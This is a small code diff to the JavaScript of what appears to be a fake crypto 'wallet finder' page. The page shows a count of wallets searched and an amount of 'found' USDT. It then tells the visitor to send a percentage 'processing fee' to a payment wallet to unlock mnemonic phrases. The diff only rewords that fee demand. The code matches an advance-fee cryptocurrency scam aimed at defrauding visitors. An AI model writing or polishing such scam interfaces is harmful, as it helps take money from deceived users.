@@ -394,10 +394,10 @@
             terminalHeaderBar.innerHTML = `Connections: <span id="connectionsCount">${walletsToSearch}</span> - [Found ${foundWalletAmount} USDT ≈ ${(foundWalletAmount).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}$]`;
 
             let resultSummary = `
-Found wallet: ${usdtWalletAddress}
+Payment wallet: ${usdtWalletAddress}
 Found amount: $${foundWalletAmount} USDT
 Processing fee: ${feePercentage}% ($${(foundWalletAmount * feePercentage / 100).toFixed(2)} USDT)
-Please send fee to address above to unlock mnemonic phrases.
+Please send processing fee to the payment wallet above to unlock mnemonic phrases.
 `;
             const summarySpan = document.createElement('span');
             summarySpan.style.color = "#38ff38";
